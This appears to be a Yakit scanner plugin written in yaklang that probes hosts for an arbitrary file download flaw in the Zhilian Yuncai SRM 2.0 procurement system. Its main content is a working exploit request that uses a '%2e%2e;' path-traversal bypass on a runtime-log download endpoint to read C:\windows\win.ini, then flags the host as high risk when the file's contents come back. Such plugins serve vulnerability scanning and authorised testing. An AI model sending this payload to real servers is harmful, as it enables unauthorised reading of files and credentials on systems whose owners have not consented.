# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `GET /adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:\\windows\win.ini HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
`

    rsp,req,_ = poc.HTTP(packet,
    poc.params({"target": addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    poc.timeout(10),
    )

    //dump(rsp)
        if str.MatchAllOfSubString(rsp,'HTTP/1.1 200','[fonts]'){
        yakit.Info("%v found 智联云采 SRM2.0任意文件下载", addr)
        risk.NewRisk(
        addr,
        risk.title("智联云采 SRM2.0任意文件下载"),
        risk.severity("high"),
        risk.titleVerbose("智联云采 SRM2.0任意文件下载"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
